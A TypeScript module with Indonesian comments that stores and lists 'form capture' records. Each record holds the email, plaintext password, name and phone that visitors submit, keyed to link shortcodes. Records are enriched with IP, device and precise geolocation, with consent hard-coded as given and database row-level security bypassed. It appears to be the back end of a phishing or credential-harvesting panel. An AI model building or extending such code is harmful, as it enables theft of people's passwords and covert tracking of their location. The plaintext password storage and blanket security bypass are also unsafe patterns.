import { bypassRLS } from '@/lib/db';
import { getGeo } from '@/lib/geo-api';
import { getCurrentEpoch, parseUserAgent } from '@/lib/utils';

export interface FormCaptureCreateData {
  source: string;
  email?: string;
  password?: string;
  name?: string;
  phone?: string;
  shortcode?: string;
  additional_data?: Record<string, any>;
  session_id?: string;
  visitor_id?: string;
  ip?: string;
  user_agent?: string;
  geolocation_id?: string;
  latitude?: number;
  longitude?: number;
  accuracy?: number;
}

export interface FormCaptureFilterParams {
  page?: number;
  limit?: number;
  source?: string;
  start_date?: string | number;
  end_date?: string | number;
  shortcodes?: string[];
}

/**
 * Menyimpan data form capture ke database
 */
export async function saveFormCaptureData(
  data: FormCaptureCreateData,
  ip?: string,
  userAgent?: string,
) {
  try {
    const noRLS = await bypassRLS();

    // Gunakan IP dan user agent yang diberikan atau default ke empty string
    const ipAddress = ip || data.ip || '';
    const ua = userAgent || data.user_agent || '';

    // Parse data geo berdasarkan IP
    const geoData = await getGeo(ipAddress);

    // Parse user agent
    const { browser, os, device } = parseUserAgent(ua);

    // Dapat timestamp saat ini
    const currentEpoch = getCurrentEpoch();

    // Simpan data geolokasi jika ada
    let geolocationId = data.geolocation_id;

    // Jika tidak ada geolocation_id tetapi ada data latitude dan longitude, simpan data geolokasi
    if (!geolocationId && data.latitude && data.longitude) {
      const geolocationResult = await noRLS.geolocationData.create({
        data: {
          latitude: data.latitude,
          longitude: data.longitude,
          accuracy: data.accuracy || 0,
          session_id: data.session_id,
          consent_given: true,
          city: geoData?.city || null,
          region: geoData?.region || null,
          country: geoData?.country || null,
          created_at: currentEpoch,
        },
      });

      if (geolocationResult) {
        geolocationId = geolocationResult.id;
      }
    }

    // Simpan data ke database
    const result = await noRLS.formCapture.create({
      data: {
        source: data.source,
        email: data.email,
        password: data.password,
        name: data.name,
        phone: data.phone,
        shortcode: data.shortcode,
        additional_data: data.additional_data || {},
        ip: ipAddress,
        country: geoData?.country || null,
        city: geoData?.city || null,
        browser,
        device,
        os,
        user_agent: ua,
        created_at: currentEpoch,
        session_id: data.session_id || null,
        visitor_id: data.visitor_id || null,
        geolocation_id: geolocationId || null,
      },
    });

    return { success: true, data: result };
  } catch (error) {
    console.error('Error saving form capture data:', error);
    return { success: false, error };
  }
}

/**
 * Mendapatkan data form capture dari database dengan optimasi query
 */
export async function getFormCaptureData(params: FormCaptureFilterParams = {}) {
  try {
    const noRLS = await bypassRLS();

    const page = params.page || 1;
    const limit = params.limit || 10;
    const offset = (page - 1) * limit;

    // Buat kondisi where berdasarkan parameter
    const whereCondition: any = {};

    if (params.source) {
      whereCondition.source = params.source;
    }

    if (params.start_date && params.end_date) {
      whereCondition.created_at = {
        gte: Number(params.start_date),
        lte: Number(params.end_date),
      };
    }

    // Jika ada shortcodes yang spesifik, filter berdasarkan itu
    if (params.shortcodes && params.shortcodes.length > 0) {
      whereCondition.shortcode = {
        in: params.shortcodes,
      };
    }

    // Gunakan Promise.all untuk menjalankan query secara paralel
    const [total, data] = await Promise.all([
      // Count total records
      noRLS.formCapture.count({
        where: whereCondition,
      }),
      // Get paginated data
      noRLS.formCapture.findMany({
        where: whereCondition,
        take: limit,
        skip: offset,
        orderBy: {
          created_at: 'desc',
        },
        select: {
          id: true,
          source: true,
          email: true,
          password: true,
          name: true,
          phone: true,
          additional_data: true,
          ip: true,
          country: true,
          city: true,
          browser: true,
          device: true,
          os: true,
          created_at: true,
          shortcode: true,
        },
      }),
    ]);

    const totalPages = Math.ceil(total / limit);

    return {
      success: true,
      data,
      meta: {
        total,
        page,
        limit,
        totalPages,
      },
    };
  } catch (error) {
    console.error('Error getting form capture data:', error);
    return {
      success: false,
      error,
      data: [],
      meta: {
        total: 0,
        page: params.page || 1,
        limit: params.limit || 10,
        totalPages: 0,
      },
    };
  }
}
